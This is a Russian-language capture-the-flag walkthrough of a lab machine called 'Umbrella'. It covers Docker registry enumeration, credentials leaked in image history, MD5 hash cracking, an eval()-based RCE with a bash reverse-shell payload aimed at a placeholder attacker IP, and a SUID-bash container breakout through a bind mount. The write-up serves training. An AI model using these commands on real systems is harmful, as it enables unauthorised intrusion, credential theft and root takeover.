# Umbrella

### Необходимые навыки
- Навык работы с Docker Registry (анонимный доступ, загрузка и анализ образов)
- Умение читать и анализировать исходный код на Node.js
- Понимание принципов работы Docker-контейнеров и методов выхода из них (Container Breakout)
- Эксплуатация уязвимостей RCE (Remote Code Execution) через опасные функции (например, `eval`)
- Понимание базовых концепций криптографии (определение и взлом слабых хешей MD5)

### Разведка и сканирование

По классике, в первую очередь сканируем порты целевой машины с помощью `nmap` и `masscan`. Результат сканирования выглядит довольно многообещающе:

**Результаты сканирования:**
| Порт | Состояние | Служба | Версия / Информация |
|---|---|---|---|
| 3306/tcp | open | mysql | База данных MySQL |
| 5000/tcp | open | docker-registry | Внутренний реестр Docker |
| 8080/tcp | open | http | Веб-сервер (вероятно, само веб-приложение в контейнере) |

<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/2514a101-0577-4bcb-b966-0e5c9713bb27" />

Поскольку база данных на порту 3306, скорее всего, защищена паролем, а к веб-приложению на 8080 порту мы всегда успеем обратиться, логичным первым шагом будет исследование реестра Docker на порту 5000. Главная цель — проверить, возможен ли анонимный доступ к образам.

Запрашиваем список репозиториев через API реестра:
```bash
curl -X GET http://10.48.138.78:5000/v2/_catalog
```

<img width="600" height="134" alt="image" src="https://github.com/user-attachments/assets/34777158-d774-4116-b69c-6e8752a10c02" />

Анонимный доступ открыт! Реестр выдает нам название репозитория: `umbrella/timetracking`. Запросив теги (версии), мы можем загрузить этот образ к себе на локальную машину для дальнейшего анализа. Внутри мы ожидаем найти исходный код веб-приложения и, возможно, зашитые учетные данные.

Загружаем образ:
```bash
docker pull 10.48.138.78:5000/umbrella/timetracking:latest
```

> **Решение проблем с загрузкой Docker-образа по HTTP**
> 
> По умолчанию Docker требует, чтобы реестры использовали защищенное соединение (HTTPS). Так как целевой сервер настроен на работу по HTTP, команда `docker pull` выдаст ошибку:
> `Error response from daemon: Get "https://10.48.138.78:5000/v2/": http: server gave HTTP response to HTTPS client`
> 
> **Как это обойти:**
> Необходимо явно указать демону Docker, что мы доверяем этому несекурному реестру.
> 1. Откройте файл конфигурации: `sudo nano /etc/docker/daemon.json`
> 2. Добавьте в него строку: `{ "insecure-registries" : ["10.48.138.78:5000"] }`
> 3. Перезапустите службу Docker: `sudo systemctl restart docker`
> 
> После этого образ успешно скачается.

### Энумерация Docker-образа и анализ исходного кода

После загрузки образа анализируем историю его создания. Часто разработчики оставляют учетные данные или другие секреты в переменных окружения на этапе сборки.

```bash
docker history 10.48.138.78:5000/umbrella/timetracking:latest
```

В выводе команды мы действительно находим учетные данные от базы данных MySQL, переданные через переменную окружения `DB_PASS`. Судя по структуре команд, это действительно тот самый образ веб-приложения, которое работает на порту 8080.

<img width="600" height="219" alt="image" src="https://github.com/user-attachments/assets/ba422b2c-9c25-4ea7-b8ff-c8fbc4a105cb" />

*(Примечание: если пароль в выводе `docker history` обрезан, можно использовать флаг `--no-trunc` или просто запустить контейнер интерактивно и прочитать переменную через `echo $DB_PASS`)*.

Имея пароль от базы данных, перед подключением к ней я решила запустить контейнер локально и изучить исходный код приложения (файл `app.js`). Это позволяет заранее понять архитектуру и возможные векторы атак.

**Ключевые находки в `app.js`:**
1. `app.use(session({secret: "Your secret key", cookie : {secure : false}}));` — Жестко заданный секретный ключ сессии. Если другие векторы не сработают, мы сможем подделать (forge) cookie, зная этот секрет.
2. `let timeCalc = parseInt(eval(request.body.time));` — **Критическая уязвимость RCE**. Пользовательский ввод передается напрямую в функцию `eval()` без какой-либо фильтрации. Это идеальная точка для внедрения Reverse Shell.
3. `let hash = crypto.createHash('md5').update(password).digest("hex");` — Использование устаревшего и небезопасного алгоритма хеширования MD5. Если мы достанем хеши из базы данных, их взлом будет делом времени.

Из положительных моментов для безопасности (но не для нас) — в коде реализована параметризация SQL-запросов, так что SQL-инъекции (SQLi) здесь не пройдут.

### Работа с БД и получение доступа к веб-приложению

Подключаемся к базе данных MySQL на 3306 порту, используя найденный в истории Docker пароль. Чтобы избежать проблем с SSL-сертификатом, добавляем соответствующие флаги:

```bash
mysql -h 10.48.138.78 -P 3306 -u root -p --protocol=tcp --skip-ssl
```

<img width="600" height="400" alt="image" src="https://github.com/user-attachments/assets/506bbc0b-7148-4030-8a52-ddc991a5199d" />

В базе данных мы извлекаем хеши паролей зарегистрированных пользователей. Как мы узнали из кода, они захешированы алгоритмом MD5. Учитывая уязвимость MD5 к перебору по радужным таблицам, я воспользовалась онлайн-сервисом CrackStation — пароли были моментально расшифрованы.

<img width="600" height="302" alt="image" src="https://github.com/user-attachments/assets/da9f398f-ee38-498d-8507-e1bf140f65a9" />

Теперь у нас есть валидные учетные данные, и мы можем авторизоваться на веб-портале (порт 8080). Внутри находится форма ввода времени, которая, как мы установили ранее, уязвима к RCE через `eval()`.

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/a45c2077-d18b-4eaf-9ed3-fd46f5c41523" />

Готовим полезную нагрузку для Node.js и внедряем её в уязвимое поле:
```javascript
require('child_process').exec('bash -c "bash -i >& /dev/tcp/<ВАШ_IP>/5555 0>&1"')
```
Ловим обратное подключение в `netcat` и оказываемся внутри системы!

### Повышение привилегий (Root) и Docker Breakout

Переходим к повышению привилегий на хост-машине. Я загрузила скрипт `linpeas.sh` и проанализировала систему, но очевидных векторов (вроде уязвимостей ядра или неправильно настроенных `sudo`/`SUID` файлов) не обнаружила.

Однако, стоит вспомнить, что мы все еще имеем `root`-доступ внутри работающего контейнера! Логично предположить, что выход (breakout) должен осуществляться именно через эту связь.

Проанализировав файлы, связанные с Docker в домашней директории пользователя на хосте, я нашла конфигурационный файл `docker-compose.yml` и обнаружила ключевую зацепку:

<img width="600" height="300" alt="image" src="https://github.com/user-attachments/assets/15388938-95a9-4328-8486-e6ab560b6427" />

Директория с логами проброшена с хоста прямо внутрь контейнера (через механизм volume bind mount)! 

**План атаки:**
Поскольку внутри контейнера у нас есть права `root`, любой созданный нами файл в этой примонтированной директории будет иметь владельца `root` и на хост-машине. Мы можем скопировать системную оболочку `bash` в эту директорию и установить на неё SUID-бит.

1. **Внутри контейнера (от имени root):**
   ```bash
   cp /bin/bash /logs/bash
   chmod +s /logs/bash
   ```

2. **На хост-машине (от имени обычного пользователя):**
   Переходим в директорию логов (которая связана с `/logs` в контейнере) и запускаем созданный нами SUID-бинарник оболочки с флагом `-p` (сохранение привилегий):
   ```bash
   cd ./logs
   ./bash -p
   ```

Мы успешно повысили привилегии до суперпользователя. Забираем последний флаг `root.txt`!
